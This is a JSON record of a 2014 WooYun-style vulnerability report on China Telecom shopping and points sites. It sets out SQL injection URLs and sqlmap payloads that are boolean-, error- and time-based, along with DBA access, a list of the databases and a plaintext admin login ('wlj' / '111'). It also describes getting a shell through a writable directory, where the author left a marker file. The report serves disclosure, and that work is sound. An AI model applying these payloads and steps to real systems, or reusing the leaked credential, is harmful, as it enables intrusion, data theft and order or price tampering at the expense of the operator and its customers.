{"id": 342, "wybug_id": "wooyun-2014-076082", "wybug_title": "中国电信SQL注入等漏洞可进入后台Getshell等威胁(二)", "wybug_corp": "中国电信", "wybug_author": "kttzd", "wybug_date": "2014-09-15 14:09", "wybug_open_date": "2014-10-30 14:10", "wybug_type": "成功的入侵事件", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-30：\t细节向公众公开  简要描述： 买手机是买锤子还是买p6那？我想多了... 详细说明：  #问题一，上个里面提了一处，但是为什么就修一处。。不把其他地方的也修了那。。#目标 http://jf.js118114.com/SearchList.aspx?sc=3000_5000          加单引号http://jf.js118114.com/SearchList.aspx?sc=3000_5000' 爆出语句。         不继续构造了。#问题二          北京电信翼商城存在注入漏洞，最后getshell#注入点           http://ego10000.com/ajax_check_user.php?email=------------------------------------------------------------------Place: GETParameter: email    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: email=' AND 6307=6307 AND 'Okvb'='Okvb    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: email=' AND (SELECT 2893 FROM(SELECT COUNT(*),CONCAT(0x717a637471,(SELECT (CASE WHEN (2893=2893) THEN 1 ELSE 0 END)),0x71766c7371,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'AmJt'='AmJt    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: email=' AND SLEEP(5) AND 'YLcy'='YLcy---[21:26:50] [INFO] the back-end DBMS is MySQLweb application technology: Nginx, PHP 5.2.14back-end DBMS: MySQL 5.0----------------------------------------------------------------#权限     ----------------------------------------------------------------[21:28:25] [INFO] testing if current user is DBA[21:28:25] [INFO] fetching current user[21:28:25] [INFO] resumed: root@localhostcurrent user is DBA:    True-----------------------------------------------------------------#数据泄漏available databases [11]:[*] dspam[*] ego10000[*] ego10000_bak[*] extmail[*] hallylure[*] information_schema[*] mysql[*] shopstit[*] stit_v3[*] test[*] ybzdb可以找到后台账户密码，并且没有md5加密。直接进后台比如 账户wlj  密码 111后台可以改订单，可以改价格。---------------------------------------------------------------------#getshell   通过http://ego10000.com/includes/footer.php 爆出路径    /var/www/site/ego10000.com/一顿试。最后/var/www/site/ego10000.com/img/big/目录可写    翻到了数据库密码，随便看下出问题的界面\ninclude_once dirname(__FILE__).'/include.php';include_once WWW_ROOT_PATH.'/cls/reg.class.php';postSql();$email = trim($_REQUEST['email']);$reg =new reg();$flag =  ($reg->check_user($email)) ? 1 : 0;echo $flag;\n      其中$email接受 email来的数据之后什么也没过滤检查，就带入check_user。（未检查chcek_user函数）运行个三则运算。   留下尾巴证明来过         http://ego10000.com/img/big/2.txt  ---------------------------------------------------------------完毕   漏洞证明：  \n\n\n\n\n\n\n\n\n\n\n\n   修复方案：  过滤   版权声明：转载请注明来源 kttzd@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2014-09-20 08:56 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-15 17:22 |    \t\t爱Gail \t\t\t( 普通白帽子  |\t\t\t        Rank:237 漏洞数:38        | 爱漏洞、爱编程、爱旅游、爱Gail)\t\t \n  等待揭秘哪个站    \n     2014-09-20 22:26 |    \t\t丸子响当当 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:5        | 学习温习•••••••)\t\t \n  电信是不是该换运维了    \n     2014-10-30 14:49 |    \t\tBMa \t\t\t( 普通白帽子  |\t\t\t        Rank:1776 漏洞数:200        )\t\t \n  一直没修复    \n     2014-10-30 16:41 |    \t\tnzk1912 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:10        | 软件开发8年了，也来挖挖漏洞，为创建安全...)\t\t \n  走的是大厂商吗？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}